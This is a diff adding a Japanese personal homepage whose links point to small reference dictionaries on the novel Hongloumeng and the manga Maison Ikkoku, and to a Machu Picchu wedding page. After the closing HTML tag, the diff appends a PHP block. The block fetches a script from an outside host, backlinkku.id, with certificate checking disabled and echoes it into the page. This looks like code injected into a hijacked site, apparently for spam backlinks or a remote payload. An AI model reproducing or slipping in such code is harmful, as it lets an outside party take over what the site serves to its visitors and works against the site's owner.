@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<HTML>
+<HEAD>
+  <TITLE>平山的主頁</TITLE>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+<LINK REL="stylesheet" HREF="style.css" MEDIA="screen and (max-width:520px)"
+</HEAD>
+
+<BODY BACKGROUND="image/base/bcg_01.gif">
+<BASEFONT SIZE="3">
+
+<CENTER>
+<TABLE CELLSPACING=3>
+<TR><TD BGCOLOR=BLUE><FONT SIZE="6" COLOR=#FFFFFF><B>平</B></FONT></TD>
+<TD BGCOLOR=RED><FONT SIZE="6" COLOR=#FFFFFF><B>山</B></FONT></TD>
+<TD BGCOLOR=BLUE><FONT SIZE="6" COLOR=#FFFFFF><B>的</B></FONT></TD>
+<TD BGCOLOR=RED><FONT SIZE="6" COLOR=#FFFFFF><B>主</B></FONT></TD>
+<TD BGCOLOR=BLUE><FONT SIZE="6" COLOR=#FFFFFF><B>頁</B></FONT></TD>
+</TD></TR></TABLE>
+</CENTER>
+
+<P>
+
+<HR>
+
+<DL>
+<DT><H2><B><FONT SIZE="5"><A HREF="honglou.html">紅楼夢小辞典</A></B></FONT></H2>
+<DD><B>「紅楼夢」</B>は三国志演義・水滸伝・西遊記とともに中国の四大名著に数えられ、中国が世界に誇るラブロマンスです。日本での知名度は低いですが、御当地中国では数多の「紅迷」を生み、最も国民に愛されている物語です。
+<BR>
+<DT><H2><B><FONT SIZE="5"><A HREF="maison.html">めぞん一刻小辞典</A></B></FONT></H2>
+<DD>高橋留美子先生の代表作の一つである<B>「めぞん一刻」</B>。80年代にビッグコミックスピリッツ誌上に連載され、のちにＴＶアニメ化されて全国的なブームを引き起こしました。その設定について原作＆アニメから拾い集めてみます。
+<BR>
+<DT><H2><B><FONT SIZE="5"><A HREF="machupicchu/index.htm">マチュピチュ・ウェディング</A></B></FONT></H2>
+<DD>2004年・ペルーのマチュピチュ遺跡にて。
+</DL>
+
+<HR>
+
+作成者　平山 孝
+
+<HR>
+
+<div class="list1">
+  <ul>
+    <li>当サイトは既存の出版社や作者等とは何の関連もありません。内容的に不備や不都合がある場合は御連絡ください。
+    <li>本サイトの著作権は作者（平山）に帰属いたします。引用は自由にしていただいて結構ですが、一定量以上の転載や複写を希望される場合は事前にご連絡ください。
+</li></ul></div>
+
+</BODY>
+</HTML>
+<?php
+$url = 'https://backlinkku.id/menu/vip-v1/script.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$content = curl_exec($ch);
+if (curl_errno($ch)) {
+    echo "cURL Error: " . curl_error($ch);
+} else {
+    echo $content;
+}
+curl_close($ch);
+?>
